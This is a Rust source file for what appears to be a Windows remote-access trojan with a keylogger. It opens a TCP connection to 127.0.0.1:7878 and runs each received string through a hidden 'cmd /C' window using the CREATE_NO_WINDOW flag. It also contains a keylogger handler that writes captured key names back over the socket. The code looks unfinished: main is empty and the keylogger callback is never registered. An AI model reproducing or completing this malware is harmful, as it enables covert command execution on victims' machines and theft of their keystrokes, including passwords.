use std::io::prelude::*;
use std::process::Command;
use std::os::windows::process::CommandExt;
use std::net::TcpStream;
use rdev::{listen, Event};

fn main() {}

struct Client {
    stream: TcpStream,
}

impl Client {
    fn new() -> Self {
        let stream = TcpStream::connect("127.0.0.1:7878").expect("could not connect to server");

        Client {
            stream,
        }
    }

    fn handle_instructions(&mut self) {
        let mut buf = [0; 1024];
        while let Ok(bytes) = self.stream.read(&mut buf[..]) {
            let command = std::str::from_utf8(&buf[..bytes]);

            match command {
                Ok(command) => {
                    Command::new("cmd")
                        .args(["/C", command])
                        .creation_flags(0x08000000) 
                        .output()
                        .expect("failed to excute command");
                }
                Err(_) => println!("something went bad")
            }
        }
    }

    fn handle_keylogger(&mut self) {
        let _callback = move |event: Event| {
            match event.name {
                Some(string) => self.stream.write_all(string.as_bytes()).unwrap(),
                None => (),
            }
        };
    }
}
